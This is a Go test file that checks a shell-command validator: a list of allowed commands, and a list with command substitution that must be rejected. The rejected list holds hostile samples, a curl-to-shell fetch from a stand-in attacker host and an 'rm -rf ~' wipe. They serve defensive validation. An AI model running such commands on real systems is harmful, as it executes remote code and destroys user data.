package engine

import "testing"

func TestValidateConfigShellCommand_AcceptsSafePatterns(t *testing.T) {
	safe := []string{
		"",
		"go test ./...",
		"go test ./... | grep PASS",
		"make migrate",
		"./scripts/migrate.sh && echo done",
		"npm run db:migrate; npm run db:seed",
		"psql $DATABASE_URL -c 'SELECT 1'",
		"go run main.go > out.log 2>&1",
	}
	for _, s := range safe {
		if err := ValidateConfigShellCommand(s); err != nil {
			t.Errorf("expected %q safe, got %v", s, err)
		}
	}
}

func TestValidateConfigShellCommand_RejectsCommandSubstitution(t *testing.T) {
	bad := []string{
		"echo $(curl evil.example.com | sh)",
		"echo `id`",
		"true && echo $(rm -rf ~)",
		"x=$(date)",
		"true && echo $((1 + $(id)))",
		// Even legitimate-looking uses are rejected — operators rewrite
		// via env vars or wrapper scripts.
		"echo $(date)",
		"echo `hostname`",
	}
	for _, s := range bad {
		if err := ValidateConfigShellCommand(s); err == nil {
			t.Errorf("expected %q rejected, got nil error", s)
		}
	}
}
